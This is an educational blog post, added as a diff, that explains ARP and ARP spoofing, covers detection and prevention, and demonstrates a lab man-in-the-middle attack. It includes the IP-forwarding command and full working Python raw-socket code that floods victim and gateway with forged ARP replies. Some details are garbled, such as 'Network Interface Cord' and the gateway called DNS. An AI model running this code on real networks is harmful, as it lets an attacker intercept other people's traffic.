@@ -1,0 +1,174 @@
+---
+title: "ARP Spoofing Using Python"
+publishedAt: "2023-05-31"
+image: "/images/gallery/thumbnail1.jpg"
+summary: "ARP protocol is what makes machine-network interaction and information exchange possible."
+tag: "arp, python"
+---
+
+## What is ARP?
+*ARP stands for Address Resolution Protocol.*   
+
+ARP protocol is what makes machine-network interaction and information exchange possible. It translates the 32-bit IP(Internet Protocol) address into a 48-bit MAC(Media Access Control) address. It is similar to the function of DNS where the domain name is translated to IP and vice versa. RARP is used to translate MAC to IP.   
+
+Unlike DNS, the ARP messages don't travel beyond the local subnet. This is due to the fact the ARP protocol works in the layer 2 switches (link layer protocol). This means the ARP Spoofing can be carried out by someone only if they are within the same network.
+<br/>
+
+## How does it work?
+Data packets in the LAN have a MAC address in the ethernet header field. This address is checked by NIC (Network Interface Cord) in the device to know if the packet belongs to the device. Thus MAC address plays an important role in where the packet is being sent to.   
+
+The host machine maintains an ARP cache(ARP table) which contains the mapping between IP and MAC.   
+
+When a device tries to send any packet this cache is checked by sending out an ARP request. This broadcasts the packet to all devices on the network and the device which knows the MAC address sends an ARP response. The ARP cache is updated with this entry.   
+
+### Steps involved in the ARP protocol
+1. ARP cache checked by using the IP as index.
+2. If MAC address found then use that address.
+3. If not then broadcast the ARP request packet over the network.
+4. Only the machine with matching IP to MAC will respond to this request and the ARP reply packet consisting of the machine's IP and MAC is sent back.
+5. The new entry is stored in the ARP cache
+<br/>
+
+## How does it lead to spoofing?
+*It all seems so organized and well thought out, so how does this become a weak spot to let the bad people into the network?*
+
+The ARP protocol was designed to be efficient and it did not take security into account. The main issue is that an ARP response from any device is just cached without any authentication. ARP is a stateless protocol and even responses sent when there was no request is cached. This means anyone can send replies(forged ARP replies) to compromise the ARP cache to their benefit.
+
+Sometimes called as ARP poisoning or  ARP poison routing, it is a type of man-in-the-middle attack that can further be used to initiate session hijacking, Distributed Denial-of-Service(DDoS) attacks, Continued packet theft and others. It causes the network traffic to be visible to the outsider.
+> ARP only works in networks using IPv4 and 32-bit IP. IPv6 however uses a more secure protocol called Neighbor Discovery Protocol(NDP). This uses cryptographic keys to confirm the identity.
+
+## How is it carried out?
+The attacker gets access to the network. Two devices(one is target and the other is the first hop router(generally DNS)) are identified. The attacker can now send forged ARP responses that cause the network traffic to be routed through the attacker. Spoofing tools like Arpspoof, Driftnet and even a simple Python script can be used to carry out the forging process.
+
+Now the target thinks the attacker is the router and the router thinks that the attacker is the target system. This causes a MiTM(Man-in-The-Middle) situation.
+
+### Steps involved in ARP spoofing
+1. First a large number of falsified ARP request and reply packets are sent. This is done to overload the switch.
+2. Switch is set in forwarding mode.
+3. The ARP cache is now flooded with spoofed ARP responses.
+<br/>
+
+## How to detect ARP Spoofing
+**There are three ways to detect ARP Spoofing:**   
+1. Using the CLI: `arp -a`
+> If two IP's have same MAC address, it means the ARP cache has been compromised.
+2. Using packet analyzers like Wireshark
+3. Using other proprietary products like XArp
+
+## How to prevent ARP Spoofing
+**Some of the methods to prevent ARP Spoofing are:**   
+- Static ARP tables
+- Switch security
+- Physical security
+- Network isolation
+- Encryption(doesn't prevent but reduces damage caused by it)
+
+<br/>
+<br/>
+<br/>
+
+<hr/>
+
+<br/>
+<br/>
+
+# Implementation and Demo of ARP Spoofing
+## Details of target device
+![ifconfig_target](/images/blogs/ifconfig_target.jpg)
+<br/>
+
+## Details of attacker device
+![ifconfig_attacker](/images/blogs/ifconfig_attacker.jpg)
+<br/>
+
+## ARP Cache before spoofing
+![arp_before_spoofing](/images/blogs/arp_b_s.jpg)
+<br/>
+
+## Ping a website before spoofing
+![ping_before_spoofing](/images/blogs/ping_b_s.jpg)
+<br/>
+
+### Target side
+![ping before spoofing(request)](/images/blogs/ping_b_s_req.jpg)
+![ping before spoofing(response)](/images/blogs/ping_b_s_res.jpg)
+<br/>
+
+### Attacker side
+![ping before spoofing](/images/blogs/ping_b_s_2.jpg)
+> Note no packets can be seen on the attacker system
+<br/>
+
+## Spoofing
+![spoofing process](/images/blogs/spoofing.jpg)
+> The code uses raw sockets so the code has to be run with sudo
+<br/>
+
+## ARP Cache after spoofing
+![arp after spoofing](/images/blogs/arp_a_s.jpg)
+> Note two IP's have same MAC. This shows that ARP has been spoofed
+<br/>
+
+## Ping a website after spoofing
+![cmd of ping](/images/blogs/cmd_ping.jpg)
+<br/>
+
+### Target side
+![wireshark of target](/images/blogs/wireshark_t.jpg)
+<br/>
+
+### Attacker side
+![wireshark of attacker](/images/blogs/wireshark_a.jpg)
+> It can be seen that the ping was not successful and from the analysis on wireshark it can be noted that the request is sent and these packets are visible on attacker device also, however no response is received. This is because by default forwarding is disabled(set to 0) and the request that is sent to the attacker is not getting forwarded to the actual router.
+<br/>
+<br/>
+
+To fix this, run the following command
+
+<CodeBlock className="my-24" compact codeInstances={[ { code: 'sudo bash -c \'echo 1 > /proc/sys/net/ipv4/ip_forward\'', label: 'Next.js', language: 'bash' }, ]} copyButton />
+![forwarding](/images/blogs/forwarding.jpg)
+
+Let's try `ping` again   
+
+![ping after forwarding](/images/blogs/ping_a_f.jpg)
+<br/>
+
+### Target side
+#### Request Frame
+![target wireshark request after forwarding](/images/blogs/wireshark_t_req_a_f.jpg)
+<br/>
+
+#### Response Frame
+![target wireshark response after forwarding](/images/blogs/wireshark_t_res_a_f.jpg)
+
+> Note the `Redirect Host` showing that there is a change in the route
+<br/>
+
+### Attacker side
+#### Request Frame
+![attacker wireshark request after forwarding](/images/blogs/wireshark_a_req_a_f.jpg)
+<br/>
+
+#### Response Frame
+![attacker wireshark response after forwarding](/images/blogs/wireshark_a_res_a_f.jpg)
+> It can be noted that after setting forwarding to true there is a redirection in the packet's route and now all the packets are sent and received through the attacker and the attacker has complete access to the network's traffic.
+<br/>
+
+## Visual Representation
+![arp spoofing visual](/images/blogs/arp_vis.png)
+<br/>
+
+
+## Source Code
+<CodeBlock className="my-24" compact codeInstances={[ { code: 'import socket\nimport struct\nimport binascii\n\ns = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800)) #0800 represents IP protocol\ns.bind(("eth0", socket.htons(0x0800)))\n\nattacker_mac = bytes("\\x00\\x0c\\x29\\xcc\\xd4\\x9b", encoding = "raw_unicode_escape")\nvictim_mac = bytes("\\x00\\x0c\\x29\\xe1\\x5b\\xe7", encoding = "raw_unicode_escape")\ngateway_mac = bytes("\\x00\\x50\\x56\\xec\\x6e\\x54", encoding = "raw_unicode_escape") #arp -a <gateway(dns) ip>\n\ncode = bytes("\\x08\\x06", encoding = "raw_unicode_escape")  #0806 indicates ARP protocol type\n\neth1 = victim_mac + attacker_mac + code\neth2 = gateway_mac + attacker_mac + code\n# creates ethernet packets(eth1 for victim, eth2 for gateway)\n\nhtype = bytes("\\x00\\x01", encoding = "raw_unicode_escape") #represents hardware address type (here ethernet)\nprotype = bytes("\\x08\\x00", encoding = "raw_unicode_escape") #represents protocol type (here IPv4)\nhsize = bytes("\\x06", encoding = "raw_unicode_escape") #size of hardware address(6bytes)\npsize = bytes("\\x04", encoding = "raw_unicode_escape") #size of protocol(4bytes)\nopcode = bytes("\\x00\\x02", encoding = "raw_unicode_escape") #type of ARP message(here ARP reply message)\n\ngateway_ip = "192.168.182.2" #cat /etc/resolv.conf (on target)\nvictim_ip = "192.168.182.131"\n\ngateway_ip1 = socket.inet_aton(gateway_ip)\nvictim_ip1 = socket.inet_aton(victim_ip)\n\nvictim_ARP = eth1 + htype + protype + hsize + psize + opcode + attacker_mac + gateway_ip1 + victim_mac + victim_ip1\ngateway_ARP = eth2 + htype + protype + hsize + psize + opcode + attacker_mac + victim_ip1 + gateway_mac + gateway_ip1\n\nprint("Spoofing started...")\nwhile(1):\n\ts.send(victim_ARP) #sent to victim\n\ts.send(gateway_ARP) #sent to gateway\n# these two trick the victim and gateway to think that the attacker is the source of network traffic', label: 'Next.js', language: 'python' }, ]} copyButton />
+
+<br/>
+
+- `socket.socket` creates a socket through which the information can be sent out and received.
+- `socket.SOCK_RAW` is an argument used to specify that raw sockets will be used.(This requires root privilage)
+- `socket.htons` converts a 16-bit host byte order into a network byte order.
+- `socket.inet_aton()` converts an IPv4 address string into a 32-bit packed binary format. (socket.inet_pton() can be used for IPv6 addresses)
+
+> To carry out spoofing the attacker needs to get into the network and identify two devices. Here the target and its local DNS is used.
+
+> To get the IP of the local DNS check the /etc/resolv.conf file, with the IP its MAC can be found by running arp -a \<IP\>
